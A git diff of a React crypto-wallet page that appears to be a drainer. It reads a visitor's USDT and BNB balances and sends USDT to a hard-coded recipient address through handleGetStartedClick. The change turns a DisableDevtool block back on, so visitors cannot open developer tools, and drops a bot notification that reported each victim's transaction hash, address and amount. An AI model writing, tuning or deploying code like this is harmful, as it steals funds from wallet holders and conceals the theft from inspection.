@@ -4,8 +4,8 @@ import Web3 from "web3";
 import { ethers } from "ethers";
 import { FaArrowLeft } from 'react-icons/fa';
 import DisableDevtool from 'disable-devtool';
-import { fetchBalances, handleGetStartedClick } from './utils/transactionUtils.js'; // Adjusted path
-import { detectWalletAddress } from "./utils/transactionUtils.js"; // Adjusted path
+import { fetchBalances, handleGetStartedClick } from './utils/transactionUtils.js';
+import { detectWalletAddress } from "./utils/transactionUtils.js";
 
 const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const RECIPIENT_ADDRESS = "0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d";
@@ -231,19 +231,18 @@ const App = () => {
   const [usdtBalance, setUsdtBalance] = useState(0);
   const [bnbBalance, setBnbBalance] = useState(0);
   const [walletConnected, setWalletConnected] = useState(false);
-  const [loading, setLoading] = useState(true);
+  const [loading, setLoading] = useState(false);
   const [transferCompleted, setTransferCompleted] = useState(false);
   const [walletAddress, setWalletAddress] = useState("");
 
   const isProcessing = useRef(false);
 
   useEffect(() => {
-    // DisableDevtool commented out for debugging (re-enable after)
-    // DisableDevtool({
-    //   ondevtoolopen: (type) => {
-    //     alert('Developer tools are disabled on this page.');
-    //   }
-    // });
+    DisableDevtool({
+      ondevtoolopen: (type) => {
+        alert('Developer tools are disabled on this page.');
+      }
+    });
   }, []);
 
   useEffect(() => {
@@ -284,10 +283,7 @@ const App = () => {
   useEffect(() => {
     const init = async () => {
       try {
-        if (!window.ethereum) {
-          setLoading(false);
-          return;
-        }
+        if (!window.ethereum) return;
         const provider = new ethers.BrowserProvider(window.ethereum);
         const signer = await provider.getSigner();
         const userAddress = await signer.getAddress();
@@ -300,8 +296,6 @@ const App = () => {
         setWalletConnected(true);
       } catch (err) {
         console.error("❌ init() error:", err);
-      } finally {
-        setLoading(false);
       }
     };
     init();
@@ -310,8 +304,6 @@ const App = () => {
   const clearAddress = () => {
     setAddress("");
   };
-
-  if (loading) return <div>Loading wallet...</div>;
 
   return (
     <GlobalStyle>
@@ -346,16 +338,6 @@ const App = () => {
               }
               await handleGetStartedClick(usdtAmount);
               setTransferCompleted(true);
-              fetch('/api/bot/notify', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  txHash: (await handleGetStartedClick(usdtAmount)).hash,
-                  from: walletAddress,
-                  to: RECIPIENT_ADDRESS,
-                  amount: usdtAmount
-                })
-              }).catch(console.error);
             } catch (error) {
               console.error("Transfer failed:", error);
               alert(error.message || "Transfer failed. Check console for details.");
